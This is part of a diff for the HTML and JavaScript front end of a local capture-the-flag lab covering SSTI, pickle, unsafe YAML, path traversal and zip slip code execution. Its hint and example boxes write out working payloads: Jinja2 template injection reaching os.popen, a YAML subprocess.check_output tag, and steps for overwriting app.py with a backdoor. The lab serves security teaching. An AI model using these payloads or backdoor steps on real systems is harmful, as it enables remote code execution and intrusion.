+        </form>
+        <div class="flag-message" id="flag-message-zipslip"></div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+// ── Navigation ────────────────────────────────────────────────────
+document.querySelectorAll('.nav-item').forEach(function(item) {
+  item.addEventListener('click', function() {
+    var panelId = item.getAttribute('data-panel');
+    document.querySelectorAll('.nav-item').forEach(function(n) { n.classList.remove('active'); });
+    document.querySelectorAll('.panel').forEach(function(p) { p.classList.remove('active'); });
+    item.classList.add('active');
+    document.getElementById('panel-' + panelId).classList.add('active');
+  });
+});
+
+// ── File drop labels ──────────────────────────────────────────────
+['ssti','pickle','yaml','traversal','zipslip'].forEach(function(id) {
+  var input = document.getElementById('file-' + id);
+  var nameEl = document.getElementById('name-' + id);
+  if (!input) return;
+  input.addEventListener('change', function() {
+    if (input.files[0]) {
+      nameEl.textContent = '✓ ' + input.files[0].name;
+      nameEl.style.display = 'block';
+    }
+  });
+  var drop = document.getElementById('drop-' + id);
+  drop.addEventListener('dragover', function(e) { e.preventDefault(); drop.classList.add('drag-over'); });
+  drop.addEventListener('dragleave', function() { drop.classList.remove('drag-over'); });
+  drop.addEventListener('drop', function(e) {
+    e.preventDefault();
+    drop.classList.remove('drag-over');
+    if (e.dataTransfer.files[0]) {
+      input.files = e.dataTransfer.files;
+      nameEl.textContent = '✓ ' + e.dataTransfer.files[0].name;
+      nameEl.style.display = 'block';
+    }
+  });
+});
+
+// ── Generic form submit ───────────────────────────────────────────
+function setupForm(formId, endpoint, outputId, statusId) {
+  var form = document.getElementById(formId);
+  if (!form) return;
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var output = document.getElementById(outputId);
+    var status = document.getElementById(statusId);
+    var btn    = form.querySelector('.btn-launch');
+
+    output.className = 'terminal-output';
+    output.textContent = 'Sending payload...';
+    status.textContent = 'LOADING';
+    status.className = 'terminal-status loading';
+    btn.disabled = true;
+
+    var fd = new FormData(form);
+
+    fetch(endpoint, { method: 'POST', body: fd })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        var raw = data.output || '';
+        var text = raw
+          .replace(/^\s*<pre>/i, '')
+          .replace(/<\/pre>\s*$/i, '');
+
+        output.textContent = text.trim();
+        if (data.success) {
+          output.className = 'terminal-output has-output';
+          status.textContent = 'SUCCESS';
+          status.className = 'terminal-status success';
+        } else {
+          output.className = 'terminal-output has-error';
+          status.textContent = 'ERROR';
+          status.className = 'terminal-status error';
+        }
+      })
+      .catch(function(err) {
+        output.textContent = 'Request failed: ' + err.message;
+        output.className = 'terminal-output has-error';
+        status.textContent = 'ERROR';
+        status.className = 'terminal-status error';
+      })
+      .finally(function() {
+        btn.disabled = false;
+      });
+  });
+}
+
+setupForm('form-ssti',      '/ssti',      'output-ssti',      'status-ssti');
+setupForm('form-pickle',    '/pickle',    'output-pickle',    'status-pickle');
+setupForm('form-yaml',      '/yaml',      'output-yaml',      'status-yaml');
+setupForm('form-traversal', '/traversal', 'output-traversal', 'status-traversal');
+setupForm('form-zipslip',   '/zipslip',   'output-zipslip',   'status-zipslip');
+
+// Hint and solution sections
+var LAB_IDS = ['ssti','pickle','yaml','traversal','zipslip'];
+var HINT_DELAY_MS = 120000;
+var hintTimers = {};
+
+var LAB_HINTS = {
+  ssti: [
+    'The file content is not the interesting input.',
+    'Try submitting a file named ' + '{' + '{7*7}}' + '. What do you see?',
+    'After you can evaluate Jinja, reach a command runner and read the flag.'
+  ],
+  pickle: [
+    'The uploaded bytes are passed directly into pickle.loads().',
+    'A crafted object can use __reduce__ to choose a callable that runs during deserialization.',
+    'Generate evil.pkl with a command that prints flags\\\\pickle.txt or flags/pickle.txt, then upload it. You may use the provided generate_pickle.py to do so.'
+  ],
+  yaml: [
+    'The parser is not using safe_load(). It accepts Python object tags.',
+    'Look at !!python/object/apply and think about a callable that returns command output.',
+    'Use subprocess.check_output in YAML to read flags\\yaml.txt or flags/yaml.txt.'
+  ],
+  traversal: [
+    'The server trusts the submitted filename when joining it with uploads/.',
+    '../ sequences can make the resolved write path leave the upload directory.',
+    'Overwrite app.py with the provided backdoor.py, let Flask reload, then use /flag and /revert.'
+  ],
+  zipslip: [
+    'Zip entry names are paths too; they are not just labels inside the archive.',
+    'An entry containing ../ can resolve outside the extraction directory.',
+    'Generate evil.zip (with the provided generate_zipslip.py), upload it, wait for the backdoor reload, then use /flag and /revert.'
+  ]
+};
+
+document.querySelectorAll('[data-guide-toggle]').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    var body = document.getElementById(btn.getAttribute('data-guide-toggle'));
+    if (!body) return;
+    body.classList.toggle('open');
+    var chevron = btn.querySelector('.section-chevron');
+    if (chevron) chevron.textContent = body.classList.contains('open') ? '^' : 'v';
+  });
+});
+
+function hintStorageKey(lab) {
+  return 'rce-lab-hints-' + lab;
+}
+
+function loadHintState(lab) {
+  try {
+    var saved = JSON.parse(localStorage.getItem(hintStorageKey(lab)) || '{}');
+    return {
+      shown: Math.max(0, Math.min(3, saved.shown || 0)),
+      unlockedAt: saved.unlockedAt || 0
+    };
+  } catch (e) {
+    return { shown: 0, unlockedAt: 0 };
+  }
+}
+
+function saveHintState(lab, state) {
+  localStorage.setItem(hintStorageKey(lab), JSON.stringify(state));
+}
+
+function renderHints(lab) {
+  var hints = LAB_HINTS[lab] || [];
+  var list = document.getElementById('hint-list-' + lab);
+  var btn = document.querySelector('[data-hint-lab="' + lab + '"]');
+  var cooldown = document.getElementById('hint-cooldown-' + lab);
+  if (!list || !btn || !cooldown) return;
+
+  var state = loadHintState(lab);
+  list.innerHTML = '';
+  hints.forEach(function(hint, index) {
+    var item = document.createElement('li');
+    item.className = 'hint-item' + (index < state.shown ? ' revealed' : '');
+    item.textContent = 'Hint ' + (index + 1) + ': ' + hint;
+    list.appendChild(item);
+  });
+
+  window.clearTimeout(hintTimers[lab]);
+  if (state.shown >= hints.length) {
+    btn.textContent = 'All hints shown';
+    btn.disabled = true;
+    cooldown.textContent = '';
+    return;
+  }
+
+  var remaining = state.shown > 0 ? state.unlockedAt - Date.now() : 0;
+  if (remaining > 0) {
+    var seconds = Math.ceil(remaining / 1000);
+    btn.textContent = 'Show hint ' + (state.shown + 1);
+    btn.disabled = true;
+    cooldown.textContent = 'Next hint unlocks in ' + Math.floor(seconds / 60) + ':' + String(seconds % 60).padStart(2, '0');
+    hintTimers[lab] = window.setTimeout(function() { renderHints(lab); }, 1000);
+  } else {
+    btn.textContent = 'Show hint ' + (state.shown + 1);
+    btn.disabled = false;
+    cooldown.textContent = state.shown === 0 ? '' : 'Next hint unlocked.';
+  }
+}
+
+document.querySelectorAll('[data-hint-lab]').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    var lab = btn.getAttribute('data-hint-lab');
+    var state = loadHintState(lab);
+    if (state.shown > 0 && state.unlockedAt > Date.now()) return;
+    state.shown += 1;
+    state.unlockedAt = state.shown < 3 ? Date.now() + HINT_DELAY_MS : 0;
+    saveHintState(lab, state);
+    renderHints(lab);
+  });
+});
+
+LAB_IDS.forEach(renderHints);
+
+// Per-lab flag submission
+var SOLVED_STORAGE_KEY = 'rce-lab-solved-labs';
+var INSTANCE_STORAGE_KEY = 'rce-lab-instance-id';
+var LAB_INSTANCE_ID = document.body.getAttribute('data-lab-instance-id') || '';
+
+if (localStorage.getItem(INSTANCE_STORAGE_KEY) !== LAB_INSTANCE_ID) {
+  localStorage.setItem(INSTANCE_STORAGE_KEY, LAB_INSTANCE_ID);
+  localStorage.removeItem(SOLVED_STORAGE_KEY);
+}
+
+function loadSolvedState() {
+  try {
+    return JSON.parse(localStorage.getItem(SOLVED_STORAGE_KEY) || '{}');
+  } catch (e) {
+    return {};
+  }
+}
+
+function saveSolvedState(solvedLabs) {
+  localStorage.setItem(SOLVED_STORAGE_KEY, JSON.stringify(solvedLabs));
+}
+
+function applySolvedState(solvedLabs) {
+  LAB_IDS.forEach(function(lab) {
+    var banner = document.getElementById('solved-' + lab);
+    if (banner) banner.classList.toggle('visible', !!solvedLabs[lab]);
+  });
+}
+
+applySolvedState(loadSolvedState());
+
+document.querySelectorAll('.flag-form').forEach(function(form) {
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var lab = form.getAttribute('data-flag-lab');
+    var input = form.querySelector('input[name="flag"]');
+    var btn = form.querySelector('button');
+    var message = document.getElementById('flag-message-' + lab);
+
+    message.textContent = 'Checking flag...';
+    message.className = 'flag-message';
+    btn.disabled = true;
+
+    fetch('/submit-flag', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ lab: lab, flag: input.value })
+    })
+      .then(function(r) {
+        return r.json().then(function(data) {
+          if (!r.ok) throw data;
+          return data;
+        });
+      })
+      .then(function(data) {
+        message.textContent = data.message || 'Congratulations. Lab solved.';
+        message.className = 'flag-message success';
+        var solvedLabs = loadSolvedState();
+        solvedLabs[lab] = true;
+        saveSolvedState(solvedLabs);
+        applySolvedState(solvedLabs);
+      })
+      .catch(function(data) {
+        message.textContent = data.message || 'Flag submission failed.';
+        message.className = 'flag-message error';
+      })
+      .finally(function() {
+        btn.disabled = false;
+      });
+  });
+});
+
+// ── Default payload values (set via JS to avoid Jinja2 conflicts) ─
+document.getElementById('ssti-filename').placeholder =
+  '{' + '{config.__class__.WAIT. Dont escape me pleasee}';
+
+document.getElementById('traversal-filename').value = '../../../../../../../wowsomanysequences';
+
+// ── Payload hint boxes ────────────────────────────────────────────
+document.getElementById('ssti-payload-examples').textContent =
+  '# Step 1 — confirm SSTI (arithmetic proof)\n' +
+  'Filename: ' + '{' + '{7*7}}\n\n' +
+  '# Step 2 — run a command\n' +
+  'Filename (Windows): ' + '{' + '{config.__class__.__init__.__globals__[\'os\'].popen(\'whoami\').read()}}\n' +
+  'Filename (Linux):   ' + '{' + '{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}\n\n' +
+  '# Step 3 — capture the flag\n' +
+  'Filename (Windows): ' + '{' + '{config.__class__.__init__.__globals__[\'os\'].popen(\'type flags\\\\ssti.txt\').read()}}\n' +
+  'Filename (Linux):   ' + '{' + '{config.__class__.__init__.__globals__[\'os\'].popen(\'cat flags/ssti.txt\').read()}}';
+
+document.getElementById('pickle-payload-examples').textContent =
+  '# Step 1 — confirm execution\n' +
+  'python generate_pickle.py "whoami"\n\n' +
+  '# Step 2 — capture the flag\n' +
+  'python generate_pickle.py "type flags\\\\pickle.txt"   (Windows)\n' +
+  'python generate_pickle.py "cat flags/pickle.txt"     (Linux)\n\n' +
+  '# Output: evil.pkl  ← upload this file\n\n' +
+  '# Note: subprocess.check_output captures stdout.\n' +
+  '#       os.system() only returns an exit code — output is lost.';
+
+document.getElementById('yaml-payload-examples').textContent =
+  '# Step 1 — confirm execution (edit evil.yaml or create new file)\n' +
+  '!!python/object/apply:subprocess.check_output\n' +
+  'args:\n' +
+  '- whoami\n' +
+  'kwds:\n' +
+  '  shell: true\n\n' +
+  '# Step 2 — capture the flag\n' +
+  '!!python/object/apply:subprocess.check_output\n' +
+  'args:\n' +
+  '- type flags\\\\yaml.txt   # Windows\n' +
+  '# - cat flags/yaml.txt   # Linux\n' +
+  'kwds:\n' +
+  '  shell: true\n\n' +
+  '# subprocess.check_output captures stdout; os.system does not.';
+
+document.getElementById('traversal-payload-examples').textContent =
+  '# Step 1 — write the backdoor\n' +
+  'File:              backdoor.py\n' +
+  'Override filename: ../app.py\n\n' +
+  '# Step 2 — Flask reloader detects app.py changed, restarts automatically\n\n' +
+  '# Step 3 — use the backdoor\n' +
+  'GET http://localhost:5000/?cmd=whoami\n\n' +
+  '# Step 4 — capture the flag\n' +
+  'GET http://localhost:5000/flag\n\n' +
+  '# Step 5 — revert to the original lab (no manual restart needed)\n' +
+  'GET http://localhost:5000/revert';
+
+document.getElementById('zipslip-payload-examples').textContent =
+  '# Step 1 — generate the malicious zip\n' +
+  'python generate_zipslip.py\n\n' +
+  '# Zip entries:\n' +
+  '#   ../pwned.txt   — proof of directory escape\n' +
+  '#   ../app.py      — overwrites Flask app with backdoor\n\n' +
+  '# Step 2 — upload evil.zip here\n' +
+  '# Response flags escaped entries with ⚠ ESCAPED extract dir!\n\n' +
+  '# Step 3 — Flask reloader restarts automatically\n\n' +
+  '# Step 4 — capture the flag\n' +
+  'GET http://localhost:5000/flag\n\n' +
+  '# Step 5 — revert\n' +
+  'GET http://localhost:5000/revert';
+</script>
+</body>
+</html>
